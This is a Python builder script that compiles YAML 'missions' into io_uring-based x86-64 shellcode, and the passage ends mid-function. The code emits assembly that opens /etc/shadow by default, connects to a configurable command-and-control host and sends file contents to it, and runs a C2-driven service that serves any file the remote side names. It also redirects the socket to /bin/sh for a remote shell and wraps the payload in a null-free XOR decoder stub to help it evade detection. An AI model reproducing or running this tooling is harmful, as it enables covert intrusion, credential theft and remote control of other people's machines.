#!/usr/bin/env python3
"""
uring_builder.py — io_uring shellcode DSL builder

Usage:
    python3 uring_builder.py missions/exfil_shadow.yaml [options]

Options:
    --ip    IP      Override C2 IP   (default: from YAML config)
    --port  PORT    Override C2 port (default: from YAML config)
    --out   FILE    Output binary    (default: shellcode.bin)
    --header FILE   Output C header  (default: shellcode.h)
    --keep-asm      Keep intermediate .asm source

Architecture:
    YAML mission → render_layer2() (uring ops + native syscall ops)
                 → NASM → validate → patch config
"""

import argparse
import random
import re
import subprocess
import struct
import sys
import tempfile
import os
from pathlib import Path

import yaml

# ----------------------------------------------------------------
# Paths
# ----------------------------------------------------------------
BUILDER_DIR  = Path(__file__).parent
REPO_ROOT    = BUILDER_DIR.parent
SHELLCODE_DIR = REPO_ROOT / 'shellcode'
BASE_ASM      = SHELLCODE_DIR / 'combined' / 'shellcode.asm'

# ----------------------------------------------------------------
# Stack frame variable → NASM frame offset mapping
# ----------------------------------------------------------------
FRAME_VARS: dict[str, str] = {
    'file_fd':    'F_FILEFD',
    'sock_fd':    'F_SOCKFD',
    'bytes_read': 'F_NBYTES',
}
FRAME_BUF = 'F_RBUF'
FRAME_SOCKADDR = 'F_SADDR'

# ----------------------------------------------------------------
# Mission parsing
# ----------------------------------------------------------------
OP_MIN_KERNEL: dict[str, tuple[int, int]] = {
    'openat': (5, 6),
    'read': (5, 6),
    'socket': (5, 19),
    'connect': (5, 5),
    'send': (5, 6),
    'recv': (5, 6),
    'close': (5, 11),
    'read_send': (5, 6),
    'file_exfil_service': (5, 11),
}


def parse_kernel_version(value: str) -> tuple[int, int]:
    """Parse a mission kernel floor such as ``5.19``."""
    match = re.fullmatch(r'(\d+)\.(\d+)', str(value).strip())
    if not match:
        raise ValueError(
            f"Invalid requires_kernel value {value!r}; expected MAJOR.MINOR"
        )
    return int(match.group(1)), int(match.group(2))


def validate_kernel_requirement(mission: dict) -> None:
    """Ensure mission metadata covers every io_uring opcode it emits."""
    required = (5, 1)
    requiring_op = 'io_uring base'

    for entry in mission['ops']:
        if not isinstance(entry, dict) or len(entry) != 1:
            raise ValueError('Each mission op must contain exactly one opcode')
        op_name = next(iter(entry))
        op_floor = OP_MIN_KERNEL.get(op_name)
        if op_floor and op_floor > required:
            required = op_floor
            requiring_op = op_name

    declared_raw = mission.get('requires_kernel')
    if declared_raw is None:
        raise ValueError(
            f"Mission missing requires_kernel; {requiring_op} needs "
            f">= {required[0]}.{required[1]}"
        )
    declared = parse_kernel_version(declared_raw)
    if declared < required:
        raise ValueError(
            f"Mission requires_kernel {declared_raw} is too low: "
            f"{requiring_op} needs >= {required[0]}.{required[1]}"
        )


def load_mission(path: Path) -> dict:
    raw = yaml.safe_load(path.read_text())
    required = ['name', 'ops']
    for field in required:
        if field not in raw:
            raise ValueError(f"Mission missing required field: '{field}'")
    if not raw.get('config'):
        raw['config'] = {}
    raw['config'].setdefault('c2_ip',   '127.0.0.1')
    raw['config'].setdefault('c2_port', 4444)
    validate_kernel_requirement(raw)
    return raw

def apply_overrides(mission: dict, ip: str | None, port: int | None) -> None:
    if ip:
        mission['config']['c2_ip']   = ip
    if port:
        mission['config']['c2_port'] = port

# ----------------------------------------------------------------
# Code generation helpers
# ----------------------------------------------------------------
def resolve_fd_load(name: str) -> str:
    """NASM snippet: load fd into ecx."""
    if name in FRAME_VARS:
        return f"    mov ecx, [r13 + {FRAME_VARS[name]}]"
    raise ValueError(f"Unknown fd variable: '{name}'")

def resolve_buf_load(name: str) -> str:
    """NASM snippet: load buffer pointer into rcx."""
    if name == 'auto' or name in ('buf', None):
        return f"    lea rcx, [r13 + {FRAME_BUF}]"
    if name in FRAME_VARS:
        return f"    mov rcx, [r13 + {FRAME_VARS[name]}]"
    raise ValueError(f"Unknown buf variable: '{name}'")

def resolve_len_load(val) -> str:
    """NASM snippet: load length into ecx."""
    if isinstance(val, int):
        if val == 4096:
            # 4096 = 0x1000 has null in encoding — use shift trick
            return (
                "    xor ecx, ecx\n"
                "    mov cl, 0x10\n"
                "    shl ecx, 8       ; ecx = 4096 (no null bytes in encoding)"
            )
        return f"    mov ecx, {val}"
    if isinstance(val, str) and val in FRAME_VARS:
        return f"    mov ecx, [r13 + {FRAME_VARS[val]}]"
    raise ValueError(f"Cannot resolve length: '{val}'")

def resolve_result_store(name: str | None) -> str:
    """NASM snippet: store ecx (CQE.res) into frame variable."""
    if not name:
        return ''
    if name in FRAME_VARS:
        return f"    mov [r13 + {FRAME_VARS[name]}], ecx"
    raise ValueError(f"Unknown result variable: '{name}'")

# ----------------------------------------------------------------
# Null-free immediate helper
# ----------------------------------------------------------------
def emit_imm32(reg: str, val: int) -> list[str]:
    """
    Load a 32-bit constant into {reg} using encodings with no null
    bytes. Supported values:
        0          → xor reg, reg
        1..255     → xor reg, reg + mov {reg}8, imm8
        any other value whose imm32 encoding has no zero bytes
                   → mov {reg}32, imm32
    Raises ValueError otherwise (choose a different constant or a
    frame variable).
    """
    if val == 0:
        return [f'    xor {reg}, {reg}']
    if not isinstance(val, int) or val < 0 or val > 0xFFFFFFFF:
        raise ValueError(f'emit_imm32: value {val!r} not a u32')
    if val <= 0xFF:
        lo = val & 0xFF
        return [
            f'    xor {reg}, {reg}',
            f'    mov {reg[0]}l, 0x{lo:02x}',     # e.g. mov cl, 0x21
        ]
    b = val.to_bytes(4, 'little')
    if 0 in b:
        raise ValueError(
            f'emit_imm32: constant {val} (0x{val:x}) would encode a '
            f'null byte; set it on the frame at runtime or change value'
        )
    return [f'    mov {reg}, 0x{val:02x}']


# ----------------------------------------------------------------
# Op renderers
# ----------------------------------------------------------------
class DataSection:
    """Collects data to emit after the mission code."""
    def __init__(self):
        self._items: list[str] = []
        self._counter = 0

    def add_path(self, path: str) -> str:
        label = f'_mpath_{self._counter}'
        self._counter += 1
        self._items.append(f'{label}: db \'{path}\', 0')
        return label

    def add_config(self, ip: str, port: int) -> tuple[str, str]:
        parts = ', '.join(str(b) for b in [int(x) for x in ip.split('.')])
        hi = (port >> 8) & 0xFF
        lo = port & 0xFF
        self._items.append(f'_config_ip:   db {parts}')
        self._items.append(f'_config_port: db 0x{hi:02x}, 0x{lo:02x}')
        return '_config_ip', '_config_port'

    def emit(self) -> str:
        return '\n'.join(self._items)


def render_openat(op: dict, uid: int, data: DataSection) -> str:
    path   = op.get('path', '/etc/shadow')
    result = op.get('result')
    label  = data.add_path(path)
    lines  = [
        f'; ---- op {uid}: openat {path} ----',
        '    call _get_sqe',
        '    mov byte [rax + SQ_OPCODE], 18       ; OP_OPENAT',
        '    mov dword [rax + SQ_FD], -100        ; AT_FDCWD (no nulls as s32)',
        f'    lea rcx, [r12 + {label} - _get_base]',
        '    mov [rax + SQ_ADDR], rcx',
        f'    mov qword [rax + SQ_UDATA], {uid}',
        '    call _io_enter',
        '    call _wait_cqe',
        '    test ecx, ecx',
        '    js _fail',
    ]
    store = resolve_result_store(result)
    if store:
        lines.append(store)
    return '\n'.join(lines)


def render_read(op: dict, uid: int, data: DataSection) -> str:
    result = op.get('result')
    fd_load  = resolve_fd_load(op['fd'])
    buf_load = resolve_buf_load(op.get('buf', 'auto'))
    len_load = resolve_len_load(op.get('len', 4096))
    lines = [
        f'; ---- op {uid}: read ----',
        '    call _get_sqe',
        '    mov byte [rax + SQ_OPCODE], 22       ; OP_READ',
        fd_load,
        '    mov [rax + SQ_FD], ecx',
        buf_load,
        '    mov [rax + SQ_ADDR], rcx',
        len_load,
        '    mov [rax + SQ_LEN], ecx',
        f'    mov qword [rax + SQ_UDATA], {uid}',
        '    call _io_enter',
        '    call _wait_cqe',
        '    test ecx, ecx',
        '    js _fail',
    ]
    store = resolve_result_store(result)
    if store:
        lines.append(store)
    return '\n'.join(lines)


def render_socket(op: dict, uid: int, data: DataSection) -> str:
    result = op.get('result')
    domain = 2  # AF_INET
    sock_type = 1  # SOCK_STREAM
    lines = [
        f'; ---- op {uid}: socket(AF_INET, SOCK_STREAM, 0) ----',
        '    call _get_sqe',
        '    mov byte [rax + SQ_OPCODE], 45       ; OP_SOCKET',
        f'    mov dword [rax + SQ_FD], {domain}    ; AF_INET',
        f'    mov qword [rax + SQ_OFF], {sock_type} ; SOCK_STREAM',
        f'    mov qword [rax + SQ_UDATA], {uid}',
        '    call _io_enter',
        '    call _wait_cqe',
        '    test ecx, ecx',
        '    js _fail',
    ]
    store = resolve_result_store(result)
    if store:
        lines.append(store)
    return '\n'.join(lines)


def render_connect(op: dict, uid: int, data: DataSection, config: dict) -> str:
    ip_label, port_label = data.add_config(
        config['c2_ip'], config['c2_port']
    )
    fd_load = resolve_fd_load(op['fd'])
    lines = [
        f'; ---- op {uid}: connect → {config["c2_ip"]}:{config["c2_port"]} ----',
        '; build sockaddr_in at F_SADDR',
        '    lea rdx, [r13 + F_SADDR]',
        '    mov word [rdx], 2                    ; AF_INET',
        f'    lea rcx, [r12 + {port_label} - _get_base]',
        '    movzx eax, word [rcx]',
        '    mov [rdx + 2], ax                    ; sin_port',
        f'    lea rcx, [r12 + {ip_label} - _get_base]',
        '    mov eax, [rcx]',
        '    mov [rdx + 4], eax                   ; sin_addr',
        '    call _get_sqe',
        '    mov byte [rax + SQ_OPCODE], 16       ; OP_CONNECT',
        fd_load,
        '    mov [rax + SQ_FD], ecx',
        '    lea rcx, [r13 + F_SADDR]',
        '    mov [rax + SQ_ADDR], rcx',
        '; CONNECT: addrlen in sqe->addr2 (SQ_OFF +8), sqe->len must be 0',
        '    push 0x10',
        '    pop rcx',
        '    mov [rax + SQ_OFF], rcx              ; addr2 = sizeof(sockaddr_in)',
        f'    mov qword [rax + SQ_UDATA], {uid}',
        '    call _io_enter',
        '    call _wait_cqe',
        '    test ecx, ecx',
        '    js _fail',
    ]
    return '\n'.join(lines)


def render_send(op: dict, uid: int, data: DataSection) -> str:
    fd_load  = resolve_fd_load(op['fd'])
    buf_load = resolve_buf_load(op.get('buf', 'auto'))
    len_load = resolve_len_load(op.get('len', 'bytes_read'))
    lines = [
        f'; ---- op {uid}: send ----',
        '    call _get_sqe',
        '    mov byte [rax + SQ_OPCODE], 26       ; OP_SEND',
        fd_load,
        '    mov [rax + SQ_FD], ecx',
        buf_load,
        '    mov [rax + SQ_ADDR], rcx',
        len_load,
        '    mov [rax + SQ_LEN], ecx',
        f'    mov qword [rax + SQ_UDATA], {uid}',
        '    call _io_enter',
        '    call _wait_cqe',
        '    test ecx, ecx',
        '    js _fail',
    ]
    store = resolve_result_store(op.get('result'))
    if store:
        lines.append(store)
    return '\n'.join(lines)


def render_close(op: dict, uid: int, data: DataSection) -> str:
    """
    IORING_OP_CLOSE (19, kernel >= 5.11 for sqe->fd direct close).

    The CQE result is deliberately NOT checked: a failed close
    (e.g. -EBADF) must not kill the host process at mission end.
    """
    fd_load = resolve_fd_load(op['fd'])
    lines = [
        f'; ---- op {uid}: close ----',
        '    call _get_sqe',
        '    mov byte [rax + SQ_OPCODE], 19       ; OP_CLOSE',
        fd_load,
        '    mov [rax + SQ_FD], ecx',
        f'    mov qword [rax + SQ_UDATA], {uid}',
        '    call _io_enter',
        '    call _wait_cqe',
        '; close result deliberately ignored — non-fatal teardown',
    ]
    return '\n'.join(lines)


def render_read_send(op: dict, uid: int, data: DataSection) -> str:
    """
    Composite op: read(fd, buf, len) → send(send_fd, buf, n).

    With `until_eof: true`, repeats the pair until read() returns 0
    (EOF), so files of any size are transferred in 4096-byte chunks
    instead of being silently truncated. Requires kernel >= 5.6
    (IORING_OP_SEND).

    Frame vars used:
        F_NBYTES — last chunk length (transient within the loop)
    """
    until_eof = bool(op.get('until_eof', False))
    loop_label = f'_readsend_{uid}'
    done_label = f'_readsend_{uid}_done'

    if 'fd' not in op or 'send_fd' not in op:
        raise ValueError(
            f"read_send op {uid}: requires 'fd' (read source) "
            f"and 'send_fd' (send target)"
        )
    fd_load     = resolve_fd_load(op['fd'])      # validate early
    send_fd_idx = resolve_fd_load(op['send_fd'])
    buf_load    = resolve_buf_load(op.get('buf', 'auto'))
    len_load    = resolve_len_load(op.get('len', 4096))

    kern = f' loop until EOF' if until_eof else ''
    lines = [f'; ---- op {uid}: read_send{kern} ----']

    if until_eof:
        lines.append(f'{loop_label}:')

    # --- READ(fd, buf, len) → n ---
    # With until_eof, off = -1 (IORING_RW_CUR_POS): the file position
    # advances across iterations. Without it, every read starts at
    # offset 0 and a file smaller than `len` loops forever.
    lines += [
        '    call _get_sqe',
        '    mov byte [rax + SQ_OPCODE], 22       ; OP_READ',
    ]
    if until_eof:
        lines.append('; off = -1 → use/advance file position (IORING_RW_CUR_POS)')
        lines.append('    mov qword [rax + SQ_OFF], -1  ; -1 imm, no null bytes')
    lines += [
        fd_load,
        '    mov [rax + SQ_FD], ecx',
        buf_load,
        '    mov [rax + SQ_ADDR], rcx',
        len_load,
        '    mov [rax + SQ_LEN], ecx',
        f'    mov qword [rax + SQ_UDATA], {uid}',
        '    call _io_enter',
        '    call _wait_cqe',
        '    test ecx, ecx',
        '    js _fail',                       # n < 0 → I/O error
    ]
    if until_eof:
        lines.append(f'    jz {done_label}')  # n == 0 → EOF

    # --- SEND(send_fd, buf, n, MSG_NOSIGNAL) ---
    lines += [
        '    mov [r13 + F_NBYTES], ecx         ; save chunk length',
        '    call _get_sqe',
        '    mov byte [rax + SQ_OPCODE], 26       ; OP_SEND',
        send_fd_idx,
        '    mov [rax + SQ_FD], ecx',
        buf_load,
        '    mov [rax + SQ_ADDR], rcx',
        '    mov ecx, [r13 + F_NBYTES]',
        '    mov [rax + SQ_LEN], ecx',
        '; MSG_NOSIGNAL = 0x4000 at SQ_OPFLAGS (+28) — avoid SIGPIPE',
        '    mov dword [rax + SQ_OPFLAGS], 0x4000   ; NULLBYTE: has nulls',
        f'    mov qword [rax + SQ_UDATA], {uid}',
        '    call _io_enter',
        '    call _wait_cqe',
        '    test ecx, ecx',
        '    js _fail',
    ]
    if until_eof:
        lines += [
            f'    jmp {loop_label}',
            f'{done_label}:',
        ]

    if until_eof and op.get('result'):
        raise ValueError(
            f"read_send op {uid}: 'result' is not supported with "
            f"'until_eof: true' (last chunk is always 0 at EOF)"
        )

    store = resolve_result_store(op.get('result'))
    if store:
        lines.append(store)
    return '\n'.join(lines)


def render_recv(op: dict, uid: int, data: DataSection) -> str:
    """IORING_OP_RECV (27, kernel >= 5.6). result = bytes received
    (0 = connection closed by peer)."""
    fd_load  = resolve_fd_load(op['fd'])
    buf_load = resolve_buf_load(op.get('buf', 'auto'))
    len_load = resolve_len_load(op.get('len', 4096))
    lines = [
        f'; ---- op {uid}: recv ----',
        '    call _get_sqe',
        '    mov byte [rax + SQ_OPCODE], 27       ; OP_RECV',
        fd_load,
        '    mov [rax + SQ_FD], ecx',
        buf_load,
        '    mov [rax + SQ_ADDR], rcx',
        len_load,
        '    mov [rax + SQ_LEN], ecx',
        f'    mov qword [rax + SQ_UDATA], {uid}',
        '    call _io_enter',
        '    call _wait_cqe',
        '    test ecx, ecx',
        '    js _fail',
    ]
    store = resolve_result_store(op.get('result'))
    if store:
        lines.append(store)
    return '\n'.join(lines)


# ----------------------------------------------------------------
# Native syscall renderers (NOT io_uring — direct `syscall`)
# These exist for operations io_uring cannot perform (dup2) and for
# primitives that would be pointless through uring (execve).
# Native results arrive in EAX, not ECX/EQE — check accordingly.
# ----------------------------------------------------------------
def render_dup2(op: dict, uid: int, data: DataSection) -> str:
    """SYS_DUP2 (33): make op['fd'] also accessible at op['new_fd'].

    The canonical use is redirecting stdin/stdout/stderr of the host
    process to a socket for a virtual shell, before a native execve.
    """
    if 'fd' not in op or 'new_fd' not in op:
        raise ValueError("dup2 op: requires 'fd' and 'new_fd' (0..255)")
    resolve_fd_load(op['fd'])   # validate against known frame vars
    fd_idx = f'    mov edi, [r13 + {FRAME_VARS[op["fd"]]}]   ; oldfd'
    new_fd = op['new_fd']
    if not isinstance(new_fd, int) or not 0 <= new_fd <= 255:
        raise ValueError(f"dup2 op: 'new_fd' must be an int 0..255, got {new_fd!r}")
    # new_fd immediate, null-free: 0 → xor; 1..255 → push imm8/pop
    if new_fd == 0:
        nfd = ['    xor esi, esi']
    else:
        nfd = [
            f'    push 0x{new_fd:02x}',
            '    pop rsi',
        ]
    lines = [
        f'; ---- op {uid}: dup2({op["fd"]}, {new_fd}) [native syscall] ----',
    ] + [
        fd_idx,
    ] + nfd + [
        '    push 0x21',
        '    pop rax                        ; SYS_DUP2 = 33',
        '    syscall',
        '    test eax, eax',               # ← native syscalls: result in EAX
        '    js _fail',
    ]
    return '\n'.join(lines)


def render_execve(op: dict, uid: int, data: DataSection) -> str:
    """SYS_EXECVE (59): replace the host process in place (no fork).

    Builds argv as a pointer array at F_ARGV (frame, zeroed at boot;
    slot NULL is already 0). Envp is NULL. On success this never
    returns, so no result check is possible or needed.
    """
    path   = op.get('path', '/bin/sh')
    argv   = op.get('argv', [path])
    if not isinstance(argv, list) or not all(isinstance(a, str) for a in argv):
        raise ValueError(f"execve op: 'argv' must be a list of strings")
    if len(argv) > 3:
        raise ValueError(
            f"execve op: at most 3 argv entries fit in F_ARGV (32 bytes), got {len(argv)}"
        )
    label = data.add_path(path)
    lines = [
        f'; ---- op {uid}: execve({path}) [native syscall, no return] ----',
        '; argv at F_ARGV: [ptr0, ptr1, ..., NULL] — slots beyond use pre-zeroed frame',
    ]
    for i, a in enumerate(argv):
        a_label = label if i == 0 else data.add_path(a)
        lines += [
            f'    lea rax, [r12 + {a_label} - _get_base]',
            f'    mov [r13 + F_ARGV + {8*i}], rax',
        ]
    lines += [
        '    push 0x3B',
        '    pop rax                        ; SYS_EXECVE = 59',
        '    mov rdi, [r13 + F_ARGV]        ; pathname = argv[0]',
        '    lea rsi, [r13 + F_ARGV]        ; argv array',
        '    xor rdx, rdx                   ; envp = NULL',
        '    syscall',
    ]
    return '\n'.join(lines)


def render_file_exfil_service(op: dict, uid: int, data: DataSection) -> str:
    """Composite uring-only command: an on-demand file-exfil service.

    Protocol over the connected socket (no native syscalls, so no
    execve / dup2 events):
        C2 sends a NUL/newline-terminated path  →  shellcode opens it,
        streams its contents back (4096-byte chunks until EOF) and
        closes the file, then waits for the next path.
        When the C2 closes the connection (recv == 0), the shellcode
        exits cleanly.

    Frame vars used: F_RBUF (shared: recv buffer, then path, then file
    chunk buffer), F_FILEFD, F_NBYTES (transient).
    """
    if 'fd' not in op:
        raise ValueError("file_exfil_service op: requires 'fd' (connected socket)")
    recv_len = op.get('recv_len', 128)
    if not isinstance(recv_len, int) or not 1 <= recv_len <= 255:
        raise ValueError(
            f'file_exfil_service: recv_len {recv_len!r} must be an int 1..255 '
            '(single-byte encodable path length only)'
        )
    fd_load = resolve_fd_load(op['fd'])
    outer   = f'_fxs_{uid}'
    loop    = f'_fxs_{uid}_recv'
    done    = f'_fxs_{uid}_done'
    # reuse the read_send renderer for the chunking engine (unique uid offset)
    chunk_uid = uid + 1000
    chunk = render_read_send(
        {'until_eof': True, 'fd': 'file_fd', 'send_fd': op['fd'],
         'buf': 'auto', 'len': 4096},
        chunk_uid, data,
    )
    close = render_close({'fd': 'file_fd'}, uid + 2000, data)
    lines = [
        f'; ---- op {uid}: file_exfil_service (C2-driven) on {op["fd"]} ----',
        f'{loop}:',
        f'    ; recv(fd={op["fd"]}, F_RBUF, {recv_len}) — 27 = OP_RECV',
        '    call _get_sqe',
        '    mov byte [rax + SQ_OPCODE], 27       ; OP_RECV',
        fd_load,
        '    mov [rax + SQ_FD], ecx',
        '    lea rcx, [r13 + F_RBUF]',
        '    mov [rax + SQ_ADDR], rcx',
        '    xor ecx, ecx',
        f'    mov cl, 0x{recv_len:02x}',
        '    mov [rax + SQ_LEN], ecx',
        f'    mov qword [rax + SQ_UDATA], {uid}',
        '    call _io_enter',
        '    call _wait_cqe',
        '    test ecx, ecx',
        '    js _fail',                       # recv error
        f'    jz {done}',                     # peer closed → clean exit
        '    mov [r13 + F_NBYTES], ecx',
        '; NUL-terminate at last byte: C2 sends <path>; newline stripped',
        '    lea rdx, [r13 + F_RBUF]',
        '    mov ecx, [r13 + F_NBYTES]',
        '    dec ecx',
        '    xor al, al',
        '    mov [rdx + rcx], al',
        '; openat(AT_FDCWD, F_RBUF, O_RDONLY)',
        '    call _get_sqe',
        '    mov byte [rax + SQ_OPCODE], 18       ; OP_OPENAT',
        '    mov dword [rax + SQ_FD], -100        ; AT_FDCWD',
        '    lea rcx, [r13 + F_RBUF]',
        '    mov [rax + SQ_ADDR], rcx',
        f'    mov qword [rax + SQ_UDATA], {uid}',
        '    call _io_enter',
        '    call _wait_cqe',
        '    test ecx, ecx',
        '    js _fail',
        '    mov [r13 + F_FILEFD], ecx',
        chunk,
        close,
        f'    jmp {loop}',
        f'{done}:',
    ]
    return '\n'.join(lines)


OP_RENDERERS = {
    'openat':    render_openat,
    'read':      render_read,
    'read_send': render_read_send,
    'recv':      render_recv,
    'socket':    render_socket,
    'connect':   render_connect,
    'send':      render_send,
    'close':     render_close,
    'file_exfil_service': render_file_exfil_service,
}

# Native (non-uring) ops — emitted as raw `syscall` instructions.
NATIVE_RENDERERS = {
    'dup2':   render_dup2,
    'execve': render_execve,
}

# ----------------------------------------------------------------
# Layer 2 renderer
# ----------------------------------------------------------------
def render_layer2(mission: dict) -> str:
    config = mission['config']
    data   = DataSection()
    code_parts: list[str] = []

    for uid, op_entry in enumerate(mission['ops'], start=1):
        if not isinstance(op_entry, dict) or len(op_entry) != 1:
            raise ValueError(f"Invalid op entry at index {uid-1}: {op_entry}")
        op_name, op = next(iter(op_entry.items()))
        if op_name in OP_RENDERERS:
            renderer = OP_RENDERERS[op_name]
            if op_name == 'connect':
                code_parts.append(renderer(op, uid, data, config))
            else:
                code_parts.append(renderer(op, uid, data))
        elif op_name in NATIVE_RENDERERS:
            code_parts.append(NATIVE_RENDERERS[op_name](op, uid, data))
        else:
            raise ValueError(
                f"Unknown opcode '{op_name}'. "
                f"Supported uring: {', '.join(sorted(OP_RENDERERS))}; "
                f"native: {', '.join(sorted(NATIVE_RENDERERS))}"
            )

    mission_code = '\n\n'.join(code_parts)
    data_asm     = data.emit()

    return mission_code, data_asm

# ----------------------------------------------------------------
# Assembly
# ----------------------------------------------------------------
def load_base() -> str:
    """Load shellcode.asm base — everything up to (not including) _mission:."""
    content = BASE_ASM.read_text()
    match   = re.search(r'^_mission:', content, re.MULTILINE)
    if not match:
        raise RuntimeError(f"_mission: label not found in {BASE_ASM}")
    return content[:match.start()].rstrip()

def build_full_asm(mission_code: str, data_asm: str, mission_name: str) -> str:
    base = load_base()
    exit_code = (
        "\n\n_exit_clean:\n"
        "    xor edi, edi\n"
        "    push SYS_EXIT\n"
        "    pop rax\n"
        "    syscall\n\n"
        "_fail:\n"
        "    push 1\n"
        "    pop rdi\n"
        "    push SYS_EXIT\n"
        "    pop rax\n"
        "    syscall\n"
    )
    data_section = (
        f"\n; ================================================================\n"
        f"; Read-only data — mission: {mission_name}\n"
        f"; ================================================================\n"
        + data_asm
        + "\n"
    )
    return '\n'.join([
        f'; Generated by uring_builder.py — mission: {mission_name}',
        '; DO NOT EDIT — modify the YAML mission and regenerate',
        base,
        '_mission:',
        mission_code,
        exit_code,
        data_section,
    ])

def assemble(source: str, outfile: Path,
             keep_asm: Path | None = None) -> dict[str, int]:
    """
    Assemble NASM source, return dict of label → byte offset
    extracted from the NASM listing file.
    """
    with tempfile.NamedTemporaryFile(suffix='.asm', mode='w',
                                     delete=False, prefix='uring_') as f:
        f.write(source)
        tmp_asm = f.name
    tmp_lst = tmp_asm.replace('.asm', '.lst')

    try:
        result = subprocess.run(
            ['nasm', '-f', 'bin',
             '-l', tmp_lst,
             '-o', str(outfile),
             tmp_asm],
            capture_output=True, text=True
        )
        if result.returncode != 0:
            src_lines = source.splitlines()
            for err in result.stderr.splitlines():
                m = re.search(r':(\d+):', err)
                if m:
                    lineno = int(m.group(1))
                    ctx = '\n'.join(
                        f"  {i+1:4d}: {src_lines[i]}"
                        for i in range(max(0, lineno-3),
                                       min(len(src_lines), lineno+2))
                    )
                    print(f"\n[!] Source context:\n{ctx}", file=sys.stderr)
            raise RuntimeError(f"NASM failed:\n{result.stderr}")

        # Parse listing for label offsets
        label_offsets: dict[str, int] = {}
        if Path(tmp_lst).exists():
            for line in Path(tmp_lst).read_text().splitlines():
                # Listing format: "  123 0000A2BC <bytes>  label: ..."
                m = re.match(r'^\s*\d+\s+([0-9A-Fa-f]+)\s+\S+.*?(_[a-z_]+):', line)
                if m:
                    label_offsets[m.group(2)] = int(m.group(1), 16)

        if keep_asm:
            keep_asm.write_text(source)
        return label_offsets

    finally:
        os.unlink(tmp_asm)
        if Path(tmp_lst).exists():
            os.unlink(tmp_lst)


def check_nulls(data: bytes) -> list[int]:
    return [i for i, b in enumerate(data) if b == 0]


# ----------------------------------------------------------------
# XOR encoder (--encode xor): null-free delivery
# ----------------------------------------------------------------
# Strategy: hand-rolled decoder stub (39 bytes, hand-pitched encodings —
# every byte deliberate and verified with nasm/ndisasm) prepended to the
# XOR-encoded payload:
#
#     [39-byte decoder stub][encoded payload (region_len bytes)]
#
# Why a 16-bit linear keystream? A flat N-byte XOR key cannot remove
# nulls: any plaintext byte set covers all 256 values, so some byte
# collides with every key. With state/step both 16-bit, each plaintext
# byte rejects ~2^8 key pairs of a 2^32 space, so a null-free key always
# exists and the builder can search for it in milliseconds.
#
# Keystream byte for payload offset i:
#     plain[i] ^ (((state + i * step) & 0xFFFF) >> 8)
#
# Decoder stub (offsets already relative to payload @39):
#     0:  EB 13         jmp short +19     ; -> call @21
#     2:  5E             pop rsi           ; backward-call land: rsi = 26
#     3:  48 8D 76 0D    lea rsi, [rsi+13] ; rsi = 39 = payload start
#     7:  66 BB kk kk    mov bx, state     ; 16-bit keystream state
#    11:  66 BA ss ss    mov dx, step
#    15:  66 B9 rr rr    mov cx, region_len
#    19:  EB 05          jmp short +5      ; -> loop @26
#    21:  E8 E8 FF FF FF call @2           ; rel32=-24 (nonzero!)
#    26:  loop: 30 3E    xor [rsi], bh     ; bh = keystream hi-byte
#    28:  48 FF C6       inc rsi
#    31:  66 01 D3       add bx, dx        ; advance keystream (mod 2^16)
#    34:  66 FF C9       dec cx
#    37:  75 F3          jnz loop
#    39:  payload...
#
# A single-byte XOR key can never remove nulls in general (any 256-byte
# plaintext window covers all key values), hence the 16-bit rolling
# keystream: it gives ~2^32 key pairs for 1036-ish byte payloads, so a
# null-free key is always found by search. Padding at the region tail
# keeps region_len free of zero bytes for the `mov cx, imm16` encode.

_STUB_LEN = 39
_STUB_TEMPLATE = bytes([
    0xEB, 0x13,                             # 0:  jmp short +19
    0x5E,                                   # 2:  pop rsi           (rsi = 26)
    0x48, 0x8D, 0x76, 0x0D,                 # 3:  lea rsi, [rsi+13] (rsi = 39)
    0x66, 0xBB, 0x00, 0x00,                 # 7:  mov bx, state
    0x66, 0xBA, 0x00, 0x00,                 # 11: mov dx, step
    0x66, 0xB9, 0x00, 0x00,                 # 15: mov cx, region_len
    0xEB, 0x05,                             # 19: jmp short +5
    0xE8, 0xE8, 0xFF, 0xFF, 0xFF,           # 21: call @2 (rel32 = -24, no nulls)
    0x30, 0x3E,                             # 26: xor [rsi], bh
    0x48, 0xFF, 0xC6,                       # 28: inc rsi
    0x66, 0x01, 0xD3,                       # 31: add bx, dx
    0x66, 0xFF, 0xC9,                       # 34: dec cx
    0x75, 0xF3,                             # 37: jnz +(-13) -> loop
])


def _rand16() -> int:
    """16-bit value whose two imm bytes are nonzero."""
    while True:
        v = random.getrandbits(16)
        if (v & 0xFF) and (v >> 8):
            return v


def xor_encode(binary: bytes) -> tuple[bytes, dict]:
    """Encode the shellcode behind a null-free PIC XOR decoder stub.

    Returns (encoded_artifact, meta). The artifact layout is
    [39-byte decoder stub][encoded region]; the region is the payload
    plus tail padding so region_len produces a zero-free ``mov cx``
    immediate. The stub hand-beat every encoding: rel32/call and
    displacement bytes are constructed so no zero byte survives.
    """
    if len(binary) > 0xFFFF:
        raise ValueError(
            f'--encode xor requires payload <= 65535 bytes, got {len(binary)}.'
        )

    region_len = max(len(binary), 0x100)      # payload + tail padding
    if (region_len & 0xFF) == 0:
        region_len += 1

    pad = region_len - len(binary)
    region = binary + b'\x90' * pad           # 0x90 filler: in-range, run-never

    payload_start = _STUB_LEN
    for _ in range(100000):
        state = _rand16()
        step = _rand16()
        encoded = bytes(
            b ^ (((state + i * step) & 0xFFFF) >> 8)
            for i, b in enumerate(region)
        )
        if 0 not in encoded:
            stub = bytearray(_STUB_TEMPLATE)
            stub[9]  = state & 0xFF
            stub[10] = (state >> 8) & 0xFF
            stub[13] = step & 0xFF
            stub[14] = (step >> 8) & 0xFF
            stub[17] = (region_len & 0xFF)
            stub[18] = (region_len >> 8) & 0xFF
            assert 0 not in stub, 'stub template invariant broken'
            assert payload_start + region_len == _STUB_LEN + region_len
            meta = {
                'encode': 'xor',
                'state': state,
                'step': step,
                'region_len': region_len,
                'payload_start': payload_start,
            }
            return bytes(stub) + encoded, meta
    raise RuntimeError('--encode xor: could not find a null-free key pair')


def compute_offsets(label_offsets: dict[str, int]) -> dict[str, int]:
    """Map NASM labels → C header define names."""
    mapping = {
        '_config_ip':   'CONFIG_IP_OFFSET',
        '_config_port': 'CONFIG_PORT_OFFSET',
    }
    return {
        define: label_offsets[label]
        for label, define in mapping.items()
        if label in label_offsets
    }

def emit_header(binary: bytes, offsets: dict, mission: dict,
                outfile: Path, encode_meta: dict = None) -> None:
    lines = [
        f'/* shellcode.h — mission: {mission["name"]} */',
        f'/* Generated by uring_builder.py — do not edit */',
        '',
        f'#define SHELLCODE_SIZE        {len(binary)}',
        f'#define SHELLCODE_MISSION     "{mission["name"]}"',
        '',
    ]
    if encode_meta is not None:
        lines += [
